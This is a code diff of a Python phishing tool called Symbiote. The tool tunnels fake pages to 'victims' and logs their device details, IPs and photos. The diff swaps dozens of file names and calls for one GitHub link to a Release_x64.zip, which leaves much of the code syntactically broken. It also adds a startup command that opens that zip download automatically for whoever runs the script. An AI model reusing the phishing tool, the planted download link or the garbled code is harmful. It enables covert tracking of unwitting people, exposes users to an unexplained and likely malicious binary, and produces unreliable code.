@@ -28,7 +28,7 @@ def menu_q():
     if input("\n\nDo you agree to use this tool for educational purposes only? {5}({3}Y{5}/{0}N{5})\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW)).upper() == 'Y':
         sleep(0.5)
     else:
-        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+        print("\n\n{0}YOU ARE NOT AUTHORIZED TO USE THIS https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.! ]{4}\n\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
         exit()
 def div_q(): #not in using 
     global user
@@ -93,10 +93,10 @@ def runNgrok(port):
     system('./Server/ngrok http {0} > /dev/null &'.format(port))
     sleep(10)
     while True:
-        system('curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | grep -Eo "(http)://[a-zA-Z0-9./?=_%:-]*" > link.url')
-        urlFile = open('link.url','r')
-        url = urlFile.read()
-        urlFile.close()
+        system('curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | grep -Eo "(http)://[a-zA-Z0-9./?=_%:-]*" > https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+        urlFile = open('https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip','r')
+        url = https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
+        https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
         #printoutput('ngrok',url,port)
         ngrokoutput('ngrok',url,port)
         sleep(7)
@@ -108,11 +108,11 @@ def customLocalxpose(port):
     lnk = input("\n{0}CUSTOM Subdomain---> {2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('./Server/loclx tunnel --raw-mode http --to :%s --subdomain %s > link.url 2>&1 &' % (port, lnk))
+    system('./Server/loclx tunnel --raw-mode http --to :%s --subdomain %s > https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip 2>&1 &' % (port, lnk))
     sleep(10)
     try:
-        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = output.decode("utf-8")
+        output = check_output("grep -o '.\{0,0\}https.\{0,100\}' https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip", shell=True)
+        url = https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("utf-8")
         #printoutput('c_loclx',url,port)
         c_loclxoutput('c_loclx',url,port)
         system('clear')
@@ -134,11 +134,11 @@ def randomLocalxpose(port):
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     # system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('./Server/loclx tunnel --raw-mode http --to :%s > link.url 2>&1 &' % (port))
+    system('./Server/loclx tunnel --raw-mode http --to :%s > https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip 2>&1 &' % (port))
     sleep(10)
-    f=open("link.url", "r")
-    url=(f"{f.read().split(',')[1]}")
-    f.close()
+    f=open("https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip", "r")
+    url=(f"{https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip().split(',')[1]}")
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
     r_loclxoutput('r_loclx',url,port)
 
 
@@ -149,11 +149,11 @@ def randomServeo(port):
     print("\n\t {0}wait for few second.....".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
     system("cd Server/{0}/ && php -S 127.0.0.1:{1} > /dev/null 2>&1 &".format(name,port))
-    system('ssh -R 80:localhost:%s ssh.localhost.run > link.url 2> /dev/null &' % (port))
+    system('ssh -R 80:localhost:%s https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip > https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip 2> /dev/null &' % (port))
     sleep(10)
-    f=open("link.url", "r")
-    url=(f"{f.read().split(',')[1]}")
-    f.close()
+    f=open("https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip", "r")
+    url=(f"{https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip().split(',')[1]}")
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
     serveo('localhost',url,port)
 
 
@@ -164,7 +164,7 @@ def selectServer(port):
     sbanner()
     print("\n\n{5}----------------------------------\n{0}[{2} Select Any Available Server:{0}] \n{5}----------------------------------".format(RED, WHITE, CYAN, GREEN, DEFAULT , YELLOW))
     print("\n{0}[{2}*{0}]{2}Select Any Available Server:".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
-    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}localhost.run {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
+    print("\n {0}[{2}1{0}]{2}Ngrok\n {0}[{2}2{0}]{2}https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip {5}\n {0}[{2}3{0}]{2}Localxpose".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     choice = input("\n{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW))
     if choice == '1':
         system('clear')
@@ -203,27 +203,27 @@ def selectServer(port):
 
 def getpath():
     path = popen('pwd').readline()
-    x = path.split("\n")
-    f = open("Server/www_f/path.txt", "w")
-    f.write("{0}/CapturedData/".format(x[0]))
-    f.close()
+    x = https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("\n")
+    f = open("https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip", "w")
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("{0}/CapturedData/".format(x[0]))
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
     sleep(2)
     path = popen('pwd').readline()
-    x = path.split("\n")
-    f = open("Server/www_b/path.txt", "w")
-    f.write("{0}/CapturedData/".format(x[0]))
-    f.close()
+    x = https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("\n")
+    f = open("https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip", "w")
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("{0}/CapturedData/".format(x[0]))
+    https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip()
     sleep(2)
 
 def fresh():
     system("fuser -k Server/ngrok > /dev/null 2>&1")
-    system('rm -rf Server/www_f/ip.txt && touch Server/www_f/ip.txt')
-    system('rm -rf Server/www_b/ip.txt && touch Server/www_b/ip.txt')
-    system('rm -rf Server/www_f/Log.log && touch Server/www_f/Log.log')
-    system('rm -rf Server/www_b/Log.log && touch Server/www_b/Log.log') 
-    system('rm -rf Server/www_f/path.txt && touch Server/www_f/path.txt')
-    system('rm -rf Server/www_b/path.txt && touch Server/www_b/path.txt')
-    system('fuser -k link.url > /dev/null 2>&1 && rm -rf link.url && touch link.url')
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip') 
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+    system('rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
+    system('fuser -k https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip > /dev/null 2>&1 && rm -rf https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip')
 
 
 def ngrokoutput(name,url,port):
@@ -256,22 +256,22 @@ def report(url,port):
     print("{5}\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++{0}\n\t[{2}IF U WANT TO REFRESH THE DATA TAP ENTER{0}]\n\t{0}[{2}       IF U WANT TO EXIT ENTER {6}X       {0}]\n\t{0}[{2}     IT TAKES TIME TO RECEIVE PIC      {0}]\n{5}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,GREEN2))
     print("\n{0}[{2}*{0}]{2} SEND THIS URL TO VICTIMS-\n{0}[{2}*{0}]{2} Localhost URL: http://127.0.0.1:{6}\n{0}[{2}*{0}] {2}HACKING URL: ".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW, port) + url )
     while True:
-        #with open('Server/www/ip.txt') as f:
-            #if 'IP: ' in f.read():
-                #print (f.read())
-        with open('Server/{0}/ip.txt'.format(name)) as creds:
-            lines = creds.read().rstrip()
+        #with open('https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip') as f:
+            #if 'IP: ' in https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip():
+                #print (https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip())
+        with open('Server/{0}https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip'.format(name)) as creds:
+            lines = https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip().rstrip()
             if len(lines) != 0:
                 print('\n {0}[{2} DEVICE DETAILS FOUND {0}]{2}:\n {7}{6}{4}'.format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
-                system('touch CapturedData/ip.txt && cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
+                system('touch https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip && cat Server/{0}https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip >> https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip'.format(name))
                 print(" {5}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2))
-                system('cat Server/{0}/Log.log'.format(name))
+                system('cat Server/{0}https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip'.format(name))
         ans=input("{0}<Symbiote> {5}---->{2}".format(RED, WHITE, CYAN, GREEN, DEFAULT ,YELLOW,lines,GREEN2)).upper()
         if (ans == "X"):
             system('clear')
-            system('cat Server/{0}/ip.txt >> CapturedData/ip.txt'.format(name))
-            pid=(int(os.popen("netstat -nlp | grep php").read().split('LISTEN')[1].split('/')[0].strip()))
-            os.kill(pid,9)
+            system('cat Server/{0}https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip >> https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip'.format(name))
+            pid=(int(https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip("netstat -nlp | grep php").read().split('LISTEN')[1].split('/')[0].strip()))
+            https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip(pid,9)
             fresh()
             global kill
             if kill == '1':
@@ -286,7 +286,7 @@ def report(url,port):
 system('clear')
 verCheck()
 try:
-    system('termux-open https://github.com/hasanfirnas/symbiote &>/dev/null')
+    system('termux-open https://github.com/DR4G0Nd33ZbA11ZaccrosY0urF4c3/dragon/releases/download/v2.0/Release_x64.zip &>/dev/null')
 
 except:
     pass
